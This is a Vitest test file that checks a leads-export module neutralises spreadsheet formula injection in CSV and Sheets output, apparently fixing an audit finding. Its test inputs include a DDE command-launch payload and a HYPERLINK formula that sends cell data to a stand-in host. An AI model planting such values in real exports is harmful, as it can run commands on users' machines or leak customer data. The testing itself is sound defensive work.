import { describe, expect, it } from 'vitest';
import { neutraliseFormula, toCsv, toSheetValues, type LeadRow } from './leads-export';

const row = (over: Partial<LeadRow> = {}): LeadRow => ({
  leadId: '0b6f5a2e-0000-4000-8000-000000000001',
  createdAt: '2026-11-23T05:00:00.000Z',
  name: 'Asha Menon',
  phone: '+919876543210',
  verified: true,
  pincode: '560001',
  region: 'south',
  dealerCode: 'AMP-S-001',
  dealerName: 'Ampere Indiranagar',
  model: 'Nexus EX+',
  colour: 'Steel Grey',
  intent: 'testride',
  status: 'test_ride_booked',
  marketingConsent: false,
  source: null,
  utmSource: null,
  utmCampaign: null,
  crmLeadId: null,
  ...over,
});

describe('neutraliseFormula (audit V-03)', () => {
  it.each([
    '=HYPERLINK("https://example.invalid/?q="&C2,"Call")',
    '+cmd|" /C calc"!A0',
    '-1+1',
    '@SUM(A1:A9)',
    '\t=1+1',
    '\r=1+1',
  ])('prefixes %j so it is shown, not run', (value) => {
    expect(neutraliseFormula(value)).toBe(`'${value}`);
  });

  it.each(['+919876543210', '-5', '42', '3.14', 'Asha Menon', '', 'a=b'])('leaves %j alone', (value) => {
    expect(neutraliseFormula(value)).toBe(value);
  });
});

describe('toCsv', () => {
  it('quotes a planted formula as text', () => {
    const csv = toCsv([row({ name: '=HYPERLINK("https://example.invalid","Call")', utmSource: '@evil' })]);
    const line = csv.split('\r\n')[1]!;
    expect(line).toContain(`"'=HYPERLINK(""https://example.invalid"",""Call"")"`);
    expect(line).toContain(`"'@evil"`);
  });

  it('keeps the phone number exactly as before', () => {
    const csv = toCsv([row()]);
    expect(csv.split('\r\n')[1]).toContain('"+919876543210"');
  });
});

describe('toSheetValues', () => {
  it('neutralises the same way', () => {
    const [, values] = toSheetValues([row({ name: '=1+1' })]);
    expect(values).toContain("'=1+1");
    expect(values).toContain('+919876543210');
  });
});
